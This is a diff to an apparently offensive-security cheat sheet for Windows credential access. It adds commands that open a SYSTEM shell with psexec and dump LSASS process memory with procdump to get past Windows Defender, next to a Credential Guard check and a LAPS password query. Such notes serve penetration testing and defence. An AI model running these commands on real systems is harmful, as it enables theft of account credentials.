@@ -179,13 +179,19 @@ Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
 ```
 
 ### LSAS.exe (Local Security Authority Subsystem Service)
-**Note:** You must have enough permissions to dump LSAS.exe and Credential Guard **cannot** be configured and running.
+**Note:** You must have enough permissions (system rights) to dump LSAS.exe and Credential Guard **cannot** be configured and running.
 
 Check if Credential Guard is configured and running
 ```powershell
 $DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
 if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
 if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
+```
+
+Create command prompt with system rights (Windows Defender will prevent process dump if you do not have system rights) and dump.
+```powershell
+psexec -i -s cmd
+procdump -ma lsass.exe lsass.dmp
 ```
 
 ## Useful URLS
